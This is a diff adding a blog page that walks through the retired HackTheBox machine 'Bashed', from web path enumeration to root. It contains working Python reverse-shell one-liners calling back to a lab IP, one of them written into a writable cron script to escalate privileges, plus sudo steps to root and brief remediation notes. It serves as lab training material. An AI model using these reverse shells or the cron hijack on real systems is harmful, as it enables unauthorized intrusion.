@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Bashed: phpbash webshell and a cron job to root — Lucky Thandel</title>
+<meta name="description" content="A webshell hiding in /dev, a writable cron script running as scriptmanager, and a passwordless sudo: the full Linux ladder on one box. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-04 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Bashed: phpbash webshell and a cron job to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Bashed is a retired HackTheBox easy Linux machine that teaches the classic web-to-root ladder in miniature. Synopsis: Apache on Ubuntu, a phpbash webshell in /dev, a writable cron script running as scriptmanager, and a passwordless sudo to root.</p>
+<h2><span class="amber">$</span> Enumeration — Nmap plus gobuster</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: scan and fuzz web paths</span>
+nmap -sC -sV -oN bashed.nmap 10.10.10.68
+gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</pre>
+<p>Gobuster finds /dev/phpbash.min.php — a full PHP terminal webshell sitting in the open. Enumerate web paths: developers leave tools behind.</p>
+<h2><span class="amber">$</span> Foothold — upgrade the webshell</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: reverse shell plus stabilize</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((&quot;10.10.14.23&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])'
+script /dev/null -c bash
+# then: export TERM=xterm, stty raw -echo; fg</pre>
+<p>phpbash is interactive in the browser, but upgrade to a real www-data shell and stabilize it before enumerating users, cron jobs, and SUID binaries.</p>
+<h2><span class="amber">$</span> Privilege escalation — writable cron script</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: hijack the minute cron</span>
+cat /etc/crontab   # /scripts/test.py runs every minute as scriptmanager
+ls -l /scripts/test.py   # writable!
+echo 'import socket,subprocess,os;s=socket.socket();s.connect((&quot;10.10.14.23&quot;,4445));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])' &gt; /scripts/test.py</pre>
+<p>A cron job runs /scripts/test.py every minute as scriptmanager — and the file is writable. Overwrite it, wait for the tick, catch the callback as scriptmanager.</p>
+<h2><span class="amber">$</span> Root — passwordless sudo</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: sudo to root, read flags</span>
+sudo -l   # scriptmanager -&gt; NOPASSWD path
+sudo su -
+cat ~/user.txt
+cat /root/root.txt</pre>
+<p>sudo -l reveals the passwordless path to root. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Treating phpbash as enough (browser shells die — always upgrade first) and running LinPEAS before the manual pass (the cron job was visible in /etc/crontab in ten seconds).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Remove dev webshells from production, never leave cron-executed scripts world-writable, and audit sudo -l output on every host. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
